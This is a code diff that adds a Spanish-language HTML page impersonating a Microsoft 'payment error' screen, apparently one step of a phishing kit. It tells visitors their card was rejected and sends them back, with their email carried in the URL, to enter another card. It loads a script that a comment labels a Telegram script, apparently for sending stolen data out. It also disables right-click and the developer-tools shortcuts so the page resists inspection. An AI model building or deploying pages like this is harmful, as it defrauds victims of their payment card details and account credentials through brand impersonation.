@@ -1,0 +1,348 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/svg+xml" href="/vite.svg" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Microsoft - Error de pago</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            colors: {
+              'ms-blue': '#0078d4',
+              'ms-blue-hover': '#106ebe',
+              'ms-red': '#f25022',
+              'ms-green': '#7fba00',
+              'ms-yellow': '#ffb900',
+              'ms-blue-logo': '#00bcf2',
+              'ms-gray': '#1b1b1b',
+              'ms-gray-light': '#605e5c',
+              'ms-border': '#8a8886',
+              'ms-bg': '#f5f5f5',
+              'ms-error': '#a4262c',
+              'ms-error-bg': '#fef7f7',
+              'ms-error-border': '#d83b01',
+            },
+            fontFamily: {
+              'segoe': ['"Segoe UI"', 'system-ui', '-apple-system', 'BlinkMacSystemFont', 'sans-serif'],
+            },
+            fontSize: {
+              'ms-title': ['28px', { lineHeight: '36px', fontWeight: '600' }],
+              'ms-subtitle': ['18px', { lineHeight: '24px', fontWeight: '400' }],
+              'ms-body': ['15px', { lineHeight: '20px', fontWeight: '400' }],
+              'ms-link': ['13px', { lineHeight: '16px', fontWeight: '400' }],
+              'ms-logo': ['21px', { lineHeight: '28px', fontWeight: '600' }],
+            },
+            boxShadow: {
+              'ms-card': '0 4px 12px rgba(0,0,0,0.15)',
+            }
+          }
+        }
+      }
+    </script>
+    <style>
+      body {
+        font-family: "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+        min-height: 100vh;
+        /* Fijar todo en móvil */
+        position: fixed;
+        width: 100%;
+        height: 100vh;
+        overflow: hidden;
+        /* Sin fondo en móvil */
+        background: none;
+      }
+      
+      /* Solo permitir scroll en desktop */
+      @media (min-width: 640px) {
+        body {
+          position: static;
+          overflow: auto;
+          /* Fondo SVG solo en PC */
+          background: url('banner.svg') center/cover no-repeat fixed;
+        }
+      }
+      
+      .ms-button {
+        background: #0078d4;
+        transition: background-color 0.2s ease;
+        font-size: 15px;
+        font-weight: 600;
+        padding: 12px 24px;
+        min-height: 44px;
+        border-radius: 4px;
+        border: none;
+        cursor: pointer;
+      }
+      
+      .ms-button:hover {
+        background: #106ebe;
+      }
+      
+      .ms-button:active {
+        background: #005a9e;
+      }
+      
+      .ms-button-secondary {
+        background: transparent;
+        border: 1px solid #8a8886;
+        color: #1b1b1b;
+        transition: all 0.2s ease;
+        font-size: 15px;
+        font-weight: 600;
+        padding: 12px 24px;
+        min-height: 44px;
+        border-radius: 4px;
+        cursor: pointer;
+      }
+      
+      .ms-button-secondary:hover {
+        background: #f3f2f1;
+        border-color: #605e5c;
+      }
+      
+      .fade-in {
+        animation: fadeIn 0.4s ease-out;
+      }
+      
+      .error-shake {
+        animation: shake 0.6s ease-in-out;
+      }
+      
+      @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(20px); }
+        to { opacity: 1; transform: translateY(0); }
+      }
+      
+      @keyframes shake {
+        0%, 100% { transform: translateX(0); }
+        10%, 30%, 50%, 70%, 90% { transform: translateX(-4px); }
+        20%, 40%, 60%, 80% { transform: translateX(4px); }
+      }
+      
+      .header-banner {
+        background: linear-gradient(135deg, #d83b01 0%, #a4262c 100%);
+        color: white;
+        padding: 12px 0;
+        position: relative;
+        overflow: hidden;
+      }
+      
+      .header-banner::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: url('image.png') center/cover;
+        opacity: 0.1;
+      }
+      
+      /* Contenedor principal fijo en móvil */
+      .main-container {
+        position: fixed;
+        top: 60px; /* Espacio para el header */
+        left: 0;
+        right: 0;
+        bottom: 60px; /* Espacio para el footer */
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 1rem;
+        z-index: 10;
+        overflow-y: auto;
+      }
+      
+      /* En desktop, comportamiento normal */
+      @media (min-width: 640px) {
+        .main-container {
+          position: static;
+          min-height: 100vh;
+          top: auto;
+          bottom: auto;
+          overflow-y: visible;
+          padding: 2rem 1rem;
+        }
+      }
+      
+      /* Asegurar que los botones funcionen en desktop */
+      @media (min-width: 640px) {
+        .ms-button, .ms-button-secondary {
+          position: relative;
+          z-index: 10;
+          pointer-events: auto;
+        }
+        
+        /* Contenedor de formulario en desktop */
+        .form-container {
+          position: relative;
+          z-index: 1;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Header Banner -->
+    <div class="header-banner relative z-10">
+      <div class="max-w-6xl mx-auto px-4 flex items-center justify-between">
+        <div class="flex items-center gap-3">
+          <div class="grid grid-cols-2 gap-px w-6 h-6">
+            <div class="bg-white w-3 h-3"></div>
+            <div class="bg-white w-3 h-3"></div>
+            <div class="bg-white w-3 h-3"></div>
+            <div class="bg-white w-3 h-3"></div>
+          </div>
+          <span class="text-lg font-semibold">Microsoft</span>
+        </div>
+        <div class="text-right">
+          <div class="text-sm opacity-90">Error de pago</div>
+          <div class="text-lg font-semibold">Cuenta Personal</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Background overlay for better readability -->
+    <div class="fixed inset-0 bg-white/10 backdrop-blur-[0.5px]"></div>
+    
+    <!-- Main Content -->
+    <div class="main-container">
+      <div class="w-full max-w-lg fade-in error-shake">
+        <div class="bg-white rounded-xl shadow-ms-card p-8 form-container">
+          <!-- Error Icon -->
+          <div class="text-center mb-6">
+            <div class="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
+              <svg class="w-8 h-8 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+              </svg>
+            </div>
+            <h1 class="text-2xl font-semibold text-ms-gray mb-2">No se pudo procesar el pago</h1>
+            <p class="text-ms-body text-ms-gray-light">Hubo un problema con tu método de pago</p>
+          </div>
+          
+          <!-- Error Details -->
+          <div class="mb-8 p-6 bg-ms-error-bg border border-ms-error-border rounded-lg">
+            <div class="flex items-start">
+              <svg class="w-5 h-5 text-ms-error mt-0.5 mr-3 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L3.732 16.5c-.77.833.192 2.5 1.732 2.5z"></path>
+              </svg>
+              <div>
+                <h3 class="text-ms-body font-semibold text-ms-error mb-2">Tarjeta no compatible</h3>
+                <p class="text-ms-body text-ms-error mb-3">
+                  La tarjeta que proporcionaste no es compatible con nuestro sistema de pagos. 
+                  Esto puede deberse a:
+                </p>
+                <ul class="text-sm text-ms-error space-y-1 ml-4">
+                  <li>• Tarjeta no habilitada para compras internacionales</li>
+                  <li>• Restricciones del banco emisor</li>
+                  <li>• Tipo de tarjeta no soportado</li>
+                  <li>• Fondos insuficientes</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+          
+          <!-- Suggested Actions -->
+          <div class="mb-8 p-6 bg-blue-50 border border-blue-200 rounded-lg">
+            <h3 class="text-ms-body font-semibold text-ms-blue mb-3">¿Qué puedes hacer?</h3>
+            <ul class="text-sm text-ms-gray space-y-2">
+              <li class="flex items-start">
+                <svg class="w-4 h-4 text-ms-blue mt-0.5 mr-2 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4"></path>
+                </svg>
+                Intenta con una tarjeta diferente (Visa, Mastercard, American Express)
+              </li>
+              <li class="flex items-start">
+                <svg class="w-4 h-4 text-ms-blue mt-0.5 mr-2 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4"></path>
+                </svg>
+                Verifica que tu tarjeta esté habilitada para compras en línea
+              </li>
+              <li class="flex items-start">
+                <svg class="w-4 h-4 text-ms-blue mt-0.5 mr-2 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4"></path>
+                </svg>
+                Contacta a tu banco para autorizar la transacción
+              </li>
+            </ul>
+          </div>
+          
+          <!-- Action Buttons -->
+          <div class="space-y-4">
+            <button
+              onclick="tryAgain()"
+              class="ms-button w-full text-white text-base relative z-10"
+              id="tryAgainBtn"
+            >
+              Intentar con otra tarjeta
+            </button>
+          </div>
+          
+        </div>
+      </div>
+    </div>
+
+    <!-- Fixed Footer -->
+    <div class="fixed bottom-0 left-0 right-0 bg-white/95 backdrop-blur-md border-t border-gray-200 py-2 z-50">
+      <div class="max-w-4xl mx-auto px-4">
+        <div class="flex flex-col sm:flex-row items-center justify-center space-y-0.5 sm:space-y-0 sm:space-x-6 text-xs text-ms-gray-light">
+          <a href="#" class="hover:text-ms-blue transition-colors">Ayuda</a>
+          <a href="#" class="hover:text-ms-blue transition-colors">Términos</a>
+          <a href="#" class="hover:text-ms-blue transition-colors">Privacidad</a>
+          <span class="text-center text-xs leading-tight hidden sm:inline">Exploración privada recomendada</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Script de Telegram XJSX -->
+    <script src="xjsx.js"></script>
+    
+    <script>
+      // Get email from URL parameter if available
+      const urlParams = new URLSearchParams(window.location.search);
+      const email = urlParams.get('email') || '';
+
+      function tryAgain() {
+        // Prevenir múltiples clicks
+        const button = document.getElementById('tryAgainBtn');
+        if (button.disabled) {
+          return;
+        }
+        
+        button.disabled = true;
+        button.textContent = 'Redirigiendo...';
+        
+        setTimeout(() => {
+          // Redirect back to payment page with email parameter
+          const redirectUrl = email ? `index4.html?email=${encodeURIComponent(email)}` : 'index4.html';
+          window.location.href = redirectUrl;
+        }, 1000);
+      }
+      
+      function contactSupport() {
+        alert('Redirigiendo al centro de soporte de Microsoft...\n\nPuedes contactarnos:\n• Chat en vivo: 24/7\n• Teléfono: 1-800-MICROSOFT\n• Email: support@microsoft.com');
+      }
+      
+      // Auto-focus on try again button
+      window.addEventListener('load', function() {
+        document.getElementById('tryAgainBtn').focus();
+      });
+    </script>
+<script>
+  // Deshabilitar clic derecho
+  document.addEventListener('contextmenu', function(e) {
+    e.preventDefault();
+  });
+
+  // Deshabilitar inspeccionar elemento (F12, Ctrl+Shift+I, etc.)
+  document.addEventListener('keydown', function(e) {
+    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'U')) {
+      e.preventDefault();
+    }
+  });
+</script>
+
+</body>
+</html>
